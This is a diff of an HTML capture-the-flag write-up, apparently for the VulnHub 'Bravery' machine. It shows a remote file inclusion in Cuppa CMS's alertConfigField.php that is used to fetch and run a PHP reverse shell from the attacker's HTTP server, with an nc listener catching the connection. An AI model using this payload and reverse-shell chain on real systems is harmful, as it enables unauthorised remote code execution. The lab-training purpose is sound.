@@ -105,7 +105,8 @@ LFI -&gt; http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../
 </code></pre><p>I can do an LFI or RFI on the system thru this vulnerability. To test it out, i will do the LFI first and Do take note to only that i only copy starting from <code>alerts</code>.</p><p>Proof of LFI Works:</p><img src=/Bravery/3.png class=center style=border-radius:8px><p>For the RCE, i will run a simple server where i can retrieve my php-reverse-shell script and run <code>nc</code> to catch the shell.</p><blockquote><p>Change the IP and the Port in the script to catch the shell</p></blockquote><p>Run <code>Python simpleHTTPServer</code> where the php-reverse-shell is:</p><pre tabindex=0><code>python3 -m http.server 9001
 </code></pre><p>Run <code>nc</code>:</p><pre tabindex=0><code>nc -lvnp 1234
 listening on [any] 1234 ...
-</code></pre><p>Lastly, run the payload on the site: <code>http://192.168.50.109/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://10.10.10.2:9001/php-reverse-shell.php</code></p><p>Check our <code>nc</code>, we should recieve a shell from running the payload:</p><pre tabindex=0><code>┌──(kali㉿kali)-[~/Vulnhub/Bravery]
+</code></pre><p>Lastly, run the payload on the site:</p><pre tabindex=0><code>http://192.168.50.109/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://10.10.10.2:9001/php-reverse-shell.php
+</code></pre><p>Check our <code>nc</code>, we should recieve a shell from running the payload:</p><pre tabindex=0><code>┌──(kali㉿kali)-[~/Vulnhub/Bravery]
 └─$ nc -lvnp 1234
 listening on [any] 1234 ...
 connect to [10.10.10.2] from (UNKNOWN) [192.168.50.109] 48362
